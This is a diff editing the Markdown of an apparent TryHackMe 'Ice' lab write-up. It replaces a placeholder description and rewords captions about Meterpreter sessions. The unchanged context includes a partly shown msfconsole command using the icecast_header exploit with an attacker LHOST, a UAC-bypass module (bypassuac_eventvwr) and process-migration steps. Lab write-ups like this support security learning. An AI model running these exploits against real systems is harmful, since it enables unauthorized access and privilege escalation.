@@ -1,6 +1,6 @@
 ---
 title: 'TryHackMe - Ice'
-description: "Lorem Ipsum"
+description: "Standard Nmap and Metasploit with mimikatz thrown into the mix for fun. Vulnerability and exploit research, privilege escalation, RDP sessions, and a few tricks to spy on the target."
 author: 'Tim Sonner'
 date: '2023-07-08'
 hero: '/thm-ice/thm-ice-hero.png'
@@ -79,7 +79,7 @@ msfconsole -x "use exploit/windows/http/icecast_header;setg RHOSTS $IP;setg LHOS
 
 > Note tun0 may not be the only tun interface. Run 'ip addr' to view interfaces, command above may need tun1.  
 
-**Get our user ID and view the icecast process**  
+**The exploit has ran. Get our user ID and view the icecast process**  
 ![](/thm-ice/thm-ice-meterpreter-ps.png)  
 > We get the same PID if we run getpid. That process is us.
 
@@ -115,6 +115,7 @@ use exploit/windows/local/bypassuac_eventvwr
 ![](/thm-ice/thm-ice-metasploit-sessions.png)  
 
 **Our user ID is the same as in the un-elevated session**  
+
 ![](/thm-ice/thm-ice-meterpreter-getuid.png)
 
 **Our privileges in the elevated session are different**  
@@ -125,7 +126,7 @@ use exploit/windows/local/bypassuac_eventvwr
 
 ![](/thm-ice/thm-ice-meterpreter-ps-elevated.png)  
 
-**Migrate to another session**  
+**Migrate to another process**  
 
 ![](/thm-ice/thm-ice-meterpreter-migrate.png)
 
